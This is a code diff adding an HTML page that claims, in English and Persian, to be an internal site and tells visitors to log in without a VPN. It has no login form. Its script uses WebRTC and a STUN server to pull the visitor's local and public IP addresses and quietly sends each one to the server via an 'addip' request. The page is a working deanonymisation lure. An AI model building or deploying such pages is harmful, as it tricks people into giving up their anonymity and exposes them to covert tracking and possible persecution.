@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+<h2>This site is an internal site. Please log in without VPN</h2>
+<h2>این سایت یک سایت داخلی است. لطفا بدون وی پی ان وارد شوید</h2>
+
+<script>
+function findIP(onNewIP) {
+  var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+  var pc = new myPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]}),
+    noop = function() {},
+    localIPs = {},
+    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
+    key;
+
+  function ipIterate(ip) {
+console.log("ip here", ip);
+    if (!localIPs[ip]) onNewIP(ip);
+    localIPs[ip] = true;
+  }
+
+  pc.createDataChannel("");
+
+  pc.createOffer(function(sdp) {
+    sdp.sdp.split('\n').forEach(function(line) {
+      if (line.indexOf('candidate') < 0) return;
+      line.match(ipRegex).forEach(ipIterate);
+    });
+    pc.setLocalDescription(sdp, noop, noop);
+  }, noop);
+
+  pc.onicecandidate = function(ice) {
+    if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+    ice.candidate.candidate.match(ipRegex).forEach(ipIterate);
+  };
+}
+
+
+
+var table = document.createElement('table');
+//ul.textContent = 'Your IPs are: '
+document.body.appendChild(table);
+
+
+function addIP(ip) {
+  $.get("addip/"+ip,function(out){});
+}
+
+findIP(addIP);
+
+</script>
+
+</body>
+</html>
